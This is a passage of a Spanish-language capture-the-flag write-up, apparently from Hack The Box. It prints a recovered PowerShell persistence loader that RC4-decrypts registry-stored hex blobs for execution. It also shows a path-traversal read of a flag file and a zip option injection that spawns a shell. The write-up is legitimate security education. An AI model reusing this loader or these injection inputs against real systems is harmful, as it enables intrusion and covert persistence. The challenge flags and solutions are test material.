+<span class="normal"><a href="#__codelineno-5-61">61</a></span>
+<span class="normal"><a href="#__codelineno-5-62">62</a></span>
+<span class="normal"><a href="#__codelineno-5-63">63</a></span>
+<span class="normal"><a href="#__codelineno-5-64">64</a></span>
+<span class="normal"><a href="#__codelineno-5-65">65</a></span>
+<span class="normal"><a href="#__codelineno-5-66">66</a></span>
+<span class="normal"><a href="#__codelineno-5-67">67</a></span>
+<span class="normal"><a href="#__codelineno-5-68">68</a></span>
+<span class="normal"><a href="#__codelineno-5-69">69</a></span>
+<span class="normal"><a href="#__codelineno-5-70">70</a></span>
+<span class="normal"><a href="#__codelineno-5-71">71</a></span>
+<span class="normal"><a href="#__codelineno-5-72">72</a></span>
+<span class="normal"><a href="#__codelineno-5-73">73</a></span>
+<span class="normal"><a href="#__codelineno-5-74">74</a></span>
+<span class="normal"><a href="#__codelineno-5-75">75</a></span>
+<span class="normal"><a href="#__codelineno-5-76">76</a></span>
+<span class="normal"><a href="#__codelineno-5-77">77</a></span>
+<span class="normal"><a href="#__codelineno-5-78">78</a></span>
+<span class="normal"><a href="#__codelineno-5-79">79</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1"></a><span class="k">function</span> <span class="n">encr</span> <span class="p">{</span>
+</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2"></a>    <span class="k">param</span><span class="p">(</span>
+</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3"></a>        <span class="no">[Byte[]]</span><span class="nv">$data</span><span class="p">,</span>
+</span><span id="__span-5-4"><a id="__codelineno-5-4" name="__codelineno-5-4"></a>        <span class="no">[Byte[]]</span><span class="nv">$key</span>
+</span><span id="__span-5-5"><a id="__codelineno-5-5" name="__codelineno-5-5"></a>      <span class="p">)</span>
+</span><span id="__span-5-6"><a id="__codelineno-5-6" name="__codelineno-5-6"></a>
+</span><span id="__span-5-7"><a id="__codelineno-5-7" name="__codelineno-5-7"></a>    <span class="no">[Byte[]]</span><span class="nv">$buffer</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">Byte</span><span class="p">[]</span> <span class="nv">$data</span><span class="p">.</span><span class="n">Length</span>
+</span><span id="__span-5-8"><a id="__codelineno-5-8" name="__codelineno-5-8"></a>    <span class="nv">$data</span><span class="p">.</span><span class="n">CopyTo</span><span class="p">(</span><span class="nv">$buffer</span><span class="p">,</span> <span class="n">0</span><span class="p">)</span>
+</span><span id="__span-5-9"><a id="__codelineno-5-9" name="__codelineno-5-9"></a>
+</span><span id="__span-5-10"><a id="__codelineno-5-10" name="__codelineno-5-10"></a>    <span class="no">[Byte[]]</span><span class="nv">$s</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">Byte</span><span class="p">[]</span> <span class="n">256</span><span class="p">;</span>
+</span><span id="__span-5-11"><a id="__codelineno-5-11" name="__codelineno-5-11"></a>    <span class="no">[Byte[]]</span><span class="nv">$k</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">Byte</span><span class="p">[]</span> <span class="n">256</span><span class="p">;</span>
+</span><span id="__span-5-12"><a id="__codelineno-5-12" name="__codelineno-5-12"></a>
+</span><span id="__span-5-13"><a id="__codelineno-5-13" name="__codelineno-5-13"></a>    <span class="k">for</span> <span class="p">(</span><span class="nv">$i</span> <span class="p">=</span> <span class="n">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">-lt</span> <span class="n">256</span><span class="p">;</span> <span class="nv">$i</span><span class="p">++)</span>
+</span><span id="__span-5-14"><a id="__codelineno-5-14" name="__codelineno-5-14"></a>    <span class="p">{</span>
+</span><span id="__span-5-15"><a id="__codelineno-5-15" name="__codelineno-5-15"></a>        <span class="nv">$s</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span> <span class="p">=</span> <span class="no">[Byte]</span><span class="nv">$i</span><span class="p">;</span>
+</span><span id="__span-5-16"><a id="__codelineno-5-16" name="__codelineno-5-16"></a>        <span class="nv">$k</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span> <span class="p">=</span> <span class="nv">$key</span><span class="p">[</span><span class="nv">$i</span> <span class="p">%</span> <span class="nv">$key</span><span class="p">.</span><span class="n">Length</span><span class="p">];</span>
+</span><span id="__span-5-17"><a id="__codelineno-5-17" name="__codelineno-5-17"></a>    <span class="p">}</span>
+</span><span id="__span-5-18"><a id="__codelineno-5-18" name="__codelineno-5-18"></a>
+</span><span id="__span-5-19"><a id="__codelineno-5-19" name="__codelineno-5-19"></a>    <span class="nv">$j</span> <span class="p">=</span> <span class="n">0</span><span class="p">;</span>
+</span><span id="__span-5-20"><a id="__codelineno-5-20" name="__codelineno-5-20"></a>    <span class="k">for</span> <span class="p">(</span><span class="nv">$i</span> <span class="p">=</span> <span class="n">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">-lt</span> <span class="n">256</span><span class="p">;</span> <span class="nv">$i</span><span class="p">++)</span>
+</span><span id="__span-5-21"><a id="__codelineno-5-21" name="__codelineno-5-21"></a>    <span class="p">{</span>
+</span><span id="__span-5-22"><a id="__codelineno-5-22" name="__codelineno-5-22"></a>        <span class="nv">$j</span> <span class="p">=</span> <span class="p">(</span><span class="nv">$j</span> <span class="p">+</span> <span class="nv">$s</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span> <span class="p">+</span> <span class="nv">$k</span><span class="p">[</span><span class="nv">$i</span><span class="p">])</span> <span class="p">%</span> <span class="n">256</span><span class="p">;</span>
+</span><span id="__span-5-23"><a id="__codelineno-5-23" name="__codelineno-5-23"></a>        <span class="nv">$temp</span> <span class="p">=</span> <span class="nv">$s</span><span class="p">[</span><span class="nv">$i</span><span class="p">];</span>
+</span><span id="__span-5-24"><a id="__codelineno-5-24" name="__codelineno-5-24"></a>        <span class="nv">$s</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span> <span class="p">=</span> <span class="nv">$s</span><span class="p">[</span><span class="nv">$j</span><span class="p">];</span>
+</span><span id="__span-5-25"><a id="__codelineno-5-25" name="__codelineno-5-25"></a>        <span class="nv">$s</span><span class="p">[</span><span class="nv">$j</span><span class="p">]</span> <span class="p">=</span> <span class="nv">$temp</span><span class="p">;</span>
+</span><span id="__span-5-26"><a id="__codelineno-5-26" name="__codelineno-5-26"></a>    <span class="p">}</span>
+</span><span id="__span-5-27"><a id="__codelineno-5-27" name="__codelineno-5-27"></a>
+</span><span id="__span-5-28"><a id="__codelineno-5-28" name="__codelineno-5-28"></a>    <span class="nv">$i</span> <span class="p">=</span> <span class="nv">$j</span> <span class="p">=</span> <span class="n">0</span><span class="p">;</span>
+</span><span id="__span-5-29"><a id="__codelineno-5-29" name="__codelineno-5-29"></a>    <span class="k">for</span> <span class="p">(</span><span class="nv">$x</span> <span class="p">=</span> <span class="n">0</span><span class="p">;</span> <span class="nv">$x</span> <span class="o">-lt</span> <span class="nv">$buffer</span><span class="p">.</span><span class="n">Length</span><span class="p">;</span> <span class="nv">$x</span><span class="p">++)</span>
+</span><span id="__span-5-30"><a id="__codelineno-5-30" name="__codelineno-5-30"></a>    <span class="p">{</span>
+</span><span id="__span-5-31"><a id="__codelineno-5-31" name="__codelineno-5-31"></a>        <span class="nv">$i</span> <span class="p">=</span> <span class="p">(</span><span class="nv">$i</span> <span class="p">+</span> <span class="n">1</span><span class="p">)</span> <span class="p">%</span> <span class="n">256</span><span class="p">;</span>
+</span><span id="__span-5-32"><a id="__codelineno-5-32" name="__codelineno-5-32"></a>        <span class="nv">$j</span> <span class="p">=</span> <span class="p">(</span><span class="nv">$j</span> <span class="p">+</span> <span class="nv">$s</span><span class="p">[</span><span class="nv">$i</span><span class="p">])</span> <span class="p">%</span> <span class="n">256</span><span class="p">;</span>
+</span><span id="__span-5-33"><a id="__codelineno-5-33" name="__codelineno-5-33"></a>        <span class="nv">$temp</span> <span class="p">=</span> <span class="nv">$s</span><span class="p">[</span><span class="nv">$i</span><span class="p">];</span>
+</span><span id="__span-5-34"><a id="__codelineno-5-34" name="__codelineno-5-34"></a>        <span class="nv">$s</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span> <span class="p">=</span> <span class="nv">$s</span><span class="p">[</span><span class="nv">$j</span><span class="p">];</span>
+</span><span id="__span-5-35"><a id="__codelineno-5-35" name="__codelineno-5-35"></a>        <span class="nv">$s</span><span class="p">[</span><span class="nv">$j</span><span class="p">]</span> <span class="p">=</span> <span class="nv">$temp</span><span class="p">;</span>
+</span><span id="__span-5-36"><a id="__codelineno-5-36" name="__codelineno-5-36"></a>        <span class="no">[int]</span><span class="nv">$t</span> <span class="p">=</span> <span class="p">(</span><span class="nv">$s</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span> <span class="p">+</span> <span class="nv">$s</span><span class="p">[</span><span class="nv">$j</span><span class="p">])</span> <span class="p">%</span> <span class="n">256</span><span class="p">;</span>
+</span><span id="__span-5-37"><a id="__codelineno-5-37" name="__codelineno-5-37"></a>        <span class="nv">$buffer</span><span class="p">[</span><span class="nv">$x</span><span class="p">]</span> <span class="p">=</span> <span class="nv">$buffer</span><span class="p">[</span><span class="nv">$x</span><span class="p">]</span> <span class="o">-bxor</span> <span class="nv">$s</span><span class="p">[</span><span class="nv">$t</span><span class="p">];</span>
+</span><span id="__span-5-38"><a id="__codelineno-5-38" name="__codelineno-5-38"></a>    <span class="p">}</span>
+</span><span id="__span-5-39"><a id="__codelineno-5-39" name="__codelineno-5-39"></a>
+</span><span id="__span-5-40"><a id="__codelineno-5-40" name="__codelineno-5-40"></a>    <span class="k">return</span> <span class="nv">$buffer</span>
+</span><span id="__span-5-41"><a id="__codelineno-5-41" name="__codelineno-5-41"></a><span class="p">}</span>
+</span><span id="__span-5-42"><a id="__codelineno-5-42" name="__codelineno-5-42"></a>
+</span><span id="__span-5-43"><a id="__codelineno-5-43" name="__codelineno-5-43"></a>
+</span><span id="__span-5-44"><a id="__codelineno-5-44" name="__codelineno-5-44"></a><span class="k">function</span> <span class="n">HexToBin</span> <span class="p">{</span>
+</span><span id="__span-5-45"><a id="__codelineno-5-45" name="__codelineno-5-45"></a>    <span class="k">param</span><span class="p">(</span>
+</span><span id="__span-5-46"><a id="__codelineno-5-46" name="__codelineno-5-46"></a>    <span class="p">[</span><span class="k">Parameter</span><span class="p">(</span>
+</span><span id="__span-5-47"><a id="__codelineno-5-47" name="__codelineno-5-47"></a>        <span class="k">Position</span><span class="p">=</span><span class="n">0</span><span class="p">,</span>
+</span><span id="__span-5-48"><a id="__codelineno-5-48" name="__codelineno-5-48"></a>        <span class="k">Mandatory</span><span class="p">=</span><span class="nv">$true</span><span class="p">,</span>
+</span><span id="__span-5-49"><a id="__codelineno-5-49" name="__codelineno-5-49"></a>        <span class="k">ValueFromPipeline</span><span class="p">=</span><span class="nv">$true</span><span class="p">)</span>
+</span><span id="__span-5-50"><a id="__codelineno-5-50" name="__codelineno-5-50"></a>    <span class="p">]</span>
+</span><span id="__span-5-51"><a id="__codelineno-5-51" name="__codelineno-5-51"></a>    <span class="no">[string]</span><span class="nv">$s</span><span class="p">)</span>
+</span><span id="__span-5-52"><a id="__codelineno-5-52" name="__codelineno-5-52"></a>    <span class="nv">$return</span> <span class="p">=</span> <span class="p">@()</span>
+</span><span id="__span-5-53"><a id="__codelineno-5-53" name="__codelineno-5-53"></a>
+</span><span id="__span-5-54"><a id="__codelineno-5-54" name="__codelineno-5-54"></a>    <span class="k">for</span> <span class="p">(</span><span class="nv">$i</span> <span class="p">=</span> <span class="n">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">-lt</span> <span class="nv">$s</span><span class="p">.</span><span class="n">Length</span> <span class="p">;</span> <span class="nv">$i</span> <span class="p">+=</span> <span class="n">2</span><span class="p">)</span>
+</span><span id="__span-5-55"><a id="__codelineno-5-55" name="__codelineno-5-55"></a>    <span class="p">{</span>
+</span><span id="__span-5-56"><a id="__codelineno-5-56" name="__codelineno-5-56"></a>        <span class="nv">$return</span> <span class="p">+=</span> <span class="no">[Byte]</span><span class="p">::</span><span class="n">Parse</span><span class="p">(</span><span class="nv">$s</span><span class="p">.</span><span class="n">Substring</span><span class="p">(</span><span class="nv">$i</span><span class="p">,</span> <span class="n">2</span><span class="p">),</span> <span class="no">[System.Globalization.NumberStyles]</span><span class="p">::</span><span class="n">HexNumber</span><span class="p">)</span>
+</span><span id="__span-5-57"><a id="__codelineno-5-57" name="__codelineno-5-57"></a>    <span class="p">}</span>
+</span><span id="__span-5-58"><a id="__codelineno-5-58" name="__codelineno-5-58"></a>
+</span><span id="__span-5-59"><a id="__codelineno-5-59" name="__codelineno-5-59"></a>    <span class="nb">Write-Output</span> <span class="nv">$return</span>
+</span><span id="__span-5-60"><a id="__codelineno-5-60" name="__codelineno-5-60"></a><span class="p">}</span>
+</span><span id="__span-5-61"><a id="__codelineno-5-61" name="__codelineno-5-61"></a>
+</span><span id="__span-5-62"><a id="__codelineno-5-62" name="__codelineno-5-62"></a><span class="nv">$enc</span> <span class="p">=</span> <span class="no">[System.Text.Encoding]</span><span class="p">::</span><span class="n">ASCII</span>
+</span><span id="__span-5-63"><a id="__codelineno-5-63" name="__codelineno-5-63"></a><span class="no">[Byte[]]</span><span class="nv">$key</span> <span class="p">=</span> <span class="nv">$enc</span><span class="p">.</span><span class="n">GetBytes</span><span class="p">(</span><span class="s2">&quot;Q0mmpr4B5rvZi3pS&quot;</span><span class="p">)</span>
+</span><span id="__span-5-64"><a id="__codelineno-5-64" name="__codelineno-5-64"></a><span class="c">#$encrypted1 = (Get-ItemProperty -Path HKCU:\SOFTWARE\ZYb78P4s).t3RBka5tL</span>
+</span><span id="__span-5-65"><a id="__codelineno-5-65" name="__codelineno-5-65"></a><span class="c">#$encrypted2 = (Get-ItemProperty -Path HKCU:\SOFTWARE\BjqAtIen).uLltjjW</span>
+</span><span id="__span-5-66"><a id="__codelineno-5-66" name="__codelineno-5-66"></a><span class="c">#$encrypted3 = (Get-ItemProperty -Path HKCU:\SOFTWARE\AppDataLow\t03A1Stq).uY4S39Da</span>
+</span><span id="__span-5-67"><a id="__codelineno-5-67" name="__codelineno-5-67"></a><span class="c">#$encrypted4 = (Get-ItemProperty -Path HKCU:\SOFTWARE\Google\Nv50zeG).Kb19fyhl</span>
+</span><span id="__span-5-68"><a id="__codelineno-5-68" name="__codelineno-5-68"></a><span class="c">#$encrypted5 = (Get-ItemProperty -Path HKCU:\AppEvents\Jx66ZG0O).jH54NW8C</span>
+</span><span id="__span-5-69"><a id="__codelineno-5-69" name="__codelineno-5-69"></a><span class="nv">$encrypted1</span> <span class="p">=</span> <span class="s2">&quot;F844A6035CF27CC4C90DFEAF579398BE6F7D5ED10270BD12A661DAD04191347559B82ED546015B07317000D8909939A4DA7953AED8B83C0FEE4EB6E120372F536BC5DC39&quot;</span>
+</span><span id="__span-5-70"><a id="__codelineno-5-70" name="__codelineno-5-70"></a><span class="nv">$encrypted2</span> <span class="p">=</span> <span class="s2">&quot;CC19F66A5F3B2E36C9B810FE7CC4D9CE342E8E00138A4F7F5CDD9EED9E09299DD7C6933CF4734E12A906FD9CE1CA57D445DB9CABF850529F5845083F34BA1&quot;</span>
+</span><span id="__span-5-71"><a id="__codelineno-5-71" name="__codelineno-5-71"></a><span class="nv">$encrypted3</span> <span class="p">=</span> <span class="s2">&quot;C08114AA67EB979D36DC3EFA0F62086B947F672BD8F966305A98EF93AA39076C3726B0EDEBFA10811A15F1CF1BEFC78AFC5E08AD8CACDB323F44B4D&quot;</span>
+</span><span id="__span-5-72"><a id="__codelineno-5-72" name="__codelineno-5-72"></a><span class="nv">$encrypted4</span> <span class="p">=</span> <span class="s2">&quot;D814EB4E244A153AF8FAA1121A5CCFD0FEAC8DD96A9B31CCF6C3E3E03C1E93626DF5B3E0B141467116CC08F92147F7A0BE0D95B0172A7F34922D6C236BC7DE54D8ACBFA70D1&quot;</span>
+</span><span id="__span-5-73"><a id="__codelineno-5-73" name="__codelineno-5-73"></a><span class="nv">$encrypted5</span> <span class="p">=</span> <span class="s2">&quot;84AB553E67C743BE696A0AC80C16E2B354C2AE7918EE08A0A3887875C83E44ACA7393F1C579EE41BCB7D336CAF8695266839907F47775F89C1F170562A6B0A01C0F3BC4CB&quot;</span>
+</span><span id="__span-5-74"><a id="__codelineno-5-74" name="__codelineno-5-74"></a><span class="nv">$encrypted</span> <span class="p">=</span> <span class="s2">&quot;</span><span class="p">$(</span><span class="nv">$encrypted1</span><span class="p">)$(</span><span class="nv">$encrypted2</span><span class="p">)$(</span><span class="nv">$encrypted3</span><span class="p">)$(</span><span class="nv">$encrypted4</span><span class="p">)$(</span><span class="nv">$encrypted5</span><span class="p">)</span><span class="s2">&quot;</span>
+</span><span id="__span-5-75"><a id="__codelineno-5-75" name="__codelineno-5-75"></a><span class="no">[Byte[]]</span><span class="nv">$data</span> <span class="p">=</span> <span class="n">HexToBin</span> <span class="nv">$encrypted</span>
+</span><span id="__span-5-76"><a id="__codelineno-5-76" name="__codelineno-5-76"></a><span class="nv">$DecryptedBytes</span> <span class="p">=</span> <span class="n">encr</span> <span class="nv">$data</span> <span class="nv">$key</span>
+</span><span id="__span-5-77"><a id="__codelineno-5-77" name="__codelineno-5-77"></a><span class="nv">$DecryptedString</span> <span class="p">=</span> <span class="nv">$enc</span><span class="p">.</span><span class="n">GetString</span><span class="p">(</span><span class="nv">$DecryptedBytes</span><span class="p">)</span>
+</span><span id="__span-5-78"><a id="__codelineno-5-78" name="__codelineno-5-78"></a><span class="nv">$DecryptedString</span>
+</span><span id="__span-5-79"><a id="__codelineno-5-79" name="__codelineno-5-79"></a><span class="c">#$DecryptedString|iex</span>
+</span></code></pre></div></td></tr></table></div>
+<p>Del cuál al ejecutarse se obtiene el valor original del parámetro ejecutado, encontrando de esta manera la bandera.</p>
+<p><img alt="Payload ejecutado" src="images/forensics/golden_persistence/payload.png" /></p>
+<blockquote>
+<p>Flag: HTB{g0ld3n_F4ng_1s_n0t_st34lthy_3n0ugh}</p>
+</blockquote>
+<h3 id="misc">Misc</h3>
+<h4 id="compressor">Compressor</h4>
+<h5 id="stats_6">Stats</h5>
+<table>
+<thead>
+<tr>
+<th>Attribute</th>
+<th>Info</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Difficulty</td>
+<td>easy</td>
+</tr>
+<tr>
+<td>Description</td>
+<td>Ramona's obsession with modifications and the addition of artifacts to her body has slowed her down and made her fail and almost get killed in many missions. For this reason, she decided to hack a tiny robot under Golden Fang's ownership called "Compressor", which can reduce and increase the volume of any object to minimize/maximize it according to the needs of the mission. With this item, she will be able to carry any spare part she needs without adding extra weight to her back, making her fast. Can you help her take it and hack it?</td>
+</tr>
+<tr>
+<td>File</td>
+<td>-</td>
+</tr>
+</tbody>
+</table>
+<h5 id="solucion_6">Solución</h5>
+<p>Para este reto se exponía una conexión a un host en donde se ofrecían diferentes opciones para interactuar con el binario disponible.</p>
+<p>De acuerdo a la interacción se encontraron 2 formas de resolver el reto, mediante un <strong>Path traversal</strong> haciendo uso de la ejecución de <code>cat</code> disponible.</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>└─$<span class="w"> </span>nc<span class="w"> </span><span class="m">138</span>.68.183.64<span class="w"> </span><span class="m">31076</span>
+</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>
+</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Directory<span class="w"> </span>to<span class="w"> </span>work<span class="w"> </span><span class="k">in</span>:<span class="w"> </span>tHV1tdX82QcPllglF8wa6AhU24FRZS4S
+</span><span id="__span-6-4"><a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a>
+</span><span id="__span-6-5"><a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a>Component<span class="w"> </span>List:
+</span><span id="__span-6-6"><a id="__codelineno-6-6" name="__codelineno-6-6" href="#__codelineno-6-6"></a>
+</span><span id="__span-6-7"><a id="__codelineno-6-7" name="__codelineno-6-7" href="#__codelineno-6-7"></a>+<span class="o">===============</span>+
+</span><span id="__span-6-8"><a id="__codelineno-6-8" name="__codelineno-6-8" href="#__codelineno-6-8"></a><span class="p">|</span><span class="w">               </span><span class="p">|</span>
+</span><span id="__span-6-9"><a id="__codelineno-6-9" name="__codelineno-6-9" href="#__codelineno-6-9"></a><span class="p">|</span><span class="w">  </span><span class="m">1</span>.<span class="w"> </span>Head<span class="w">  </span>🤖<span class="w">  </span><span class="p">|</span>
+</span><span id="__span-6-10"><a id="__codelineno-6-10" name="__codelineno-6-10" href="#__codelineno-6-10"></a><span class="p">|</span><span class="w">  </span><span class="m">2</span>.<span class="w"> </span>Torso<span class="w"> </span>🦴<span class="w">   </span><span class="p">|</span>
+</span><span id="__span-6-11"><a id="__codelineno-6-11" name="__codelineno-6-11" href="#__codelineno-6-11"></a><span class="p">|</span><span class="w">  </span><span class="m">3</span>.<span class="w"> </span>Hands<span class="w"> </span>💪<span class="w">  </span><span class="p">|</span>
+</span><span id="__span-6-12"><a id="__codelineno-6-12" name="__codelineno-6-12" href="#__codelineno-6-12"></a><span class="p">|</span><span class="w">  </span><span class="m">4</span>.<span class="w"> </span>Legs<span class="w">  </span>🦵<span class="w">   </span><span class="p">|</span>
+</span><span id="__span-6-13"><a id="__codelineno-6-13" name="__codelineno-6-13" href="#__codelineno-6-13"></a><span class="p">|</span><span class="w">               </span><span class="p">|</span>
+</span><span id="__span-6-14"><a id="__codelineno-6-14" name="__codelineno-6-14" href="#__codelineno-6-14"></a>+<span class="o">===============</span>+
+</span><span id="__span-6-15"><a id="__codelineno-6-15" name="__codelineno-6-15" href="#__codelineno-6-15"></a>
+</span><span id="__span-6-16"><a id="__codelineno-6-16" name="__codelineno-6-16" href="#__codelineno-6-16"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Choose<span class="w"> </span>component:<span class="w"> </span><span class="m">1</span>
+</span><span id="__span-6-17"><a id="__codelineno-6-17" name="__codelineno-6-17" href="#__codelineno-6-17"></a>
+</span><span id="__span-6-18"><a id="__codelineno-6-18" name="__codelineno-6-18" href="#__codelineno-6-18"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Sub-directory<span class="w"> </span>to<span class="w"> </span>work<span class="w"> </span><span class="k">in</span>:<span class="w"> </span>tHV1tdX82QcPllglF8wa6AhU24FRZS4S/Head
+</span><span id="__span-6-19"><a id="__codelineno-6-19" name="__codelineno-6-19" href="#__codelineno-6-19"></a>
+</span><span id="__span-6-20"><a id="__codelineno-6-20" name="__codelineno-6-20" href="#__codelineno-6-20"></a>
+</span><span id="__span-6-21"><a id="__codelineno-6-21" name="__codelineno-6-21" href="#__codelineno-6-21"></a>Actions:
+</span><span id="__span-6-22"><a id="__codelineno-6-22" name="__codelineno-6-22" href="#__codelineno-6-22"></a>
+</span><span id="__span-6-23"><a id="__codelineno-6-23" name="__codelineno-6-23" href="#__codelineno-6-23"></a><span class="m">1</span>.<span class="w"> </span>Create<span class="w"> </span>artifact
+</span><span id="__span-6-24"><a id="__codelineno-6-24" name="__codelineno-6-24" href="#__codelineno-6-24"></a><span class="m">2</span>.<span class="w"> </span>List<span class="w"> </span>directory<span class="w">    </span><span class="o">(</span>pwd<span class="p">;</span><span class="w"> </span>ls<span class="w"> </span>-la<span class="o">)</span>
+</span><span id="__span-6-25"><a id="__codelineno-6-25" name="__codelineno-6-25" href="#__codelineno-6-25"></a><span class="m">3</span>.<span class="w"> </span>Read<span class="w"> </span>artifact<span class="w">     </span><span class="o">(</span>cat<span class="w"> </span>./&lt;name&gt;<span class="o">)</span>
+</span><span id="__span-6-26"><a id="__codelineno-6-26" name="__codelineno-6-26" href="#__codelineno-6-26"></a><span class="m">4</span>.<span class="w"> </span>Compress<span class="w"> </span>artifact<span class="w"> </span><span class="o">(</span>zip<span class="w"> </span>&lt;name&gt;.zip<span class="w"> </span>&lt;name&gt;<span class="w"> </span>&lt;options&gt;<span class="o">)</span>
+</span><span id="__span-6-27"><a id="__codelineno-6-27" name="__codelineno-6-27" href="#__codelineno-6-27"></a><span class="m">5</span>.<span class="w"> </span>Change<span class="w"> </span>directory<span class="w">  </span><span class="o">(</span><span class="nb">cd</span><span class="w"> </span>&lt;dirname&gt;<span class="o">)</span>
+</span><span id="__span-6-28"><a id="__codelineno-6-28" name="__codelineno-6-28" href="#__codelineno-6-28"></a><span class="m">6</span>.<span class="w"> </span>Clean<span class="w"> </span>directory<span class="w">   </span><span class="o">(</span>rm<span class="w"> </span>-rf<span class="w"> </span>./*<span class="o">)</span>
+</span><span id="__span-6-29"><a id="__codelineno-6-29" name="__codelineno-6-29" href="#__codelineno-6-29"></a><span class="m">7</span>.<span class="w"> </span>Exit
+</span><span id="__span-6-30"><a id="__codelineno-6-30" name="__codelineno-6-30" href="#__codelineno-6-30"></a>
+</span><span id="__span-6-31"><a id="__codelineno-6-31" name="__codelineno-6-31" href="#__codelineno-6-31"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Choose<span class="w"> </span>action:<span class="w"> </span><span class="m">3</span>
+</span><span id="__span-6-32"><a id="__codelineno-6-32" name="__codelineno-6-32" href="#__codelineno-6-32"></a>
+</span><span id="__span-6-33"><a id="__codelineno-6-33" name="__codelineno-6-33" href="#__codelineno-6-33"></a>
+</span><span id="__span-6-34"><a id="__codelineno-6-34" name="__codelineno-6-34" href="#__codelineno-6-34"></a>Insert<span class="w"> </span>name<span class="w"> </span>you<span class="w"> </span>want<span class="w"> </span>to<span class="w"> </span>read:<span class="w"> </span>../../flag.txt
+</span><span id="__span-6-35"><a id="__codelineno-6-35" name="__codelineno-6-35" href="#__codelineno-6-35"></a>HTB<span class="o">{</span>GTFO_4nd_m4k3_th3_b35t_4rt1f4ct5<span class="o">}</span>
+</span></code></pre></div>
+<p>Y también por medio de la utilidad expuesta de <code>zip</code> se encuentra un <a href="https://gtfobins.github.io/gtfobins/zip/#shell">GTFOBin</a> el cuál permite la invocación de una shell.</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>Actions:
+</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>
+</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a><span class="m">1</span>.<span class="w"> </span>Create<span class="w"> </span>artifact
+</span><span id="__span-7-4"><a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a><span class="m">2</span>.<span class="w"> </span>List<span class="w"> </span>directory<span class="w">    </span><span class="o">(</span>pwd<span class="p">;</span><span class="w"> </span>ls<span class="w"> </span>-la<span class="o">)</span>
+</span><span id="__span-7-5"><a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a><span class="m">3</span>.<span class="w"> </span>Read<span class="w"> </span>artifact<span class="w">     </span><span class="o">(</span>cat<span class="w"> </span>./&lt;name&gt;<span class="o">)</span>
+</span><span id="__span-7-6"><a id="__codelineno-7-6" name="__codelineno-7-6" href="#__codelineno-7-6"></a><span class="m">4</span>.<span class="w"> </span>Compress<span class="w"> </span>artifact<span class="w"> </span><span class="o">(</span>zip<span class="w"> </span>&lt;name&gt;.zip<span class="w"> </span>&lt;name&gt;<span class="w"> </span>&lt;options&gt;<span class="o">)</span>
+</span><span id="__span-7-7"><a id="__codelineno-7-7" name="__codelineno-7-7" href="#__codelineno-7-7"></a><span class="m">5</span>.<span class="w"> </span>Change<span class="w"> </span>directory<span class="w">  </span><span class="o">(</span><span class="nb">cd</span><span class="w"> </span>&lt;dirname&gt;<span class="o">)</span>
+</span><span id="__span-7-8"><a id="__codelineno-7-8" name="__codelineno-7-8" href="#__codelineno-7-8"></a><span class="m">6</span>.<span class="w"> </span>Clean<span class="w"> </span>directory<span class="w">   </span><span class="o">(</span>rm<span class="w"> </span>-rf<span class="w"> </span>./*<span class="o">)</span>
+</span><span id="__span-7-9"><a id="__codelineno-7-9" name="__codelineno-7-9" href="#__codelineno-7-9"></a><span class="m">7</span>.<span class="w"> </span>Exit
+</span><span id="__span-7-10"><a id="__codelineno-7-10" name="__codelineno-7-10" href="#__codelineno-7-10"></a>
+</span><span id="__span-7-11"><a id="__codelineno-7-11" name="__codelineno-7-11" href="#__codelineno-7-11"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Choose<span class="w"> </span>action:<span class="w"> </span><span class="m">4</span>
+</span><span id="__span-7-12"><a id="__codelineno-7-12" name="__codelineno-7-12" href="#__codelineno-7-12"></a>
+</span><span id="__span-7-13"><a id="__codelineno-7-13" name="__codelineno-7-13" href="#__codelineno-7-13"></a>
+</span><span id="__span-7-14"><a id="__codelineno-7-14" name="__codelineno-7-14" href="#__codelineno-7-14"></a>Insert<span class="w"> </span>&lt;name&gt;.zip:
+</span><span id="__span-7-15"><a id="__codelineno-7-15" name="__codelineno-7-15" href="#__codelineno-7-15"></a>Insert<span class="w"> </span>&lt;name&gt;:<span class="w"> </span>/etc/passwd
+</span><span id="__span-7-16"><a id="__codelineno-7-16" name="__codelineno-7-16" href="#__codelineno-7-16"></a>Insert<span class="w"> </span>&lt;options&gt;:<span class="w"> </span>-T<span class="w"> </span>-TT<span class="w"> </span><span class="s1">&#39;sh #&#39;</span>
